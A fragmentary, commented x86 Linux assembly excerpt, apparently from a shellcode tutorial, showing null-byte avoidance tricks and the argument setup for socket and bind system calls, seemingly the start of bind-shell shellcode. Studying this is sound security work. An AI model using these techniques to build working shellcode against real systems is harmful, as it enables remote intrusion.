...
; source : http://jkukunas.blogspot.lu/2010/05/x86-linux-networking-system-calls.html 
...
; here we use bl register instead of ebx because "mov ebx,0x1" contains null bytes, bad example: b8 66 00 00 00 mov eax,0x66
mov    bl,0x1

; the two next operands simply replace "push 0x0" which also contains a null byte, we will usually use xor x,x and push x to push 0  
xor eax,eax
push eax 
...
mov    bl,0x2
; again we push arguments to bind syscall onto the stack  
; push 0x0 
xor    esi,esi
push   esi
; port argument 
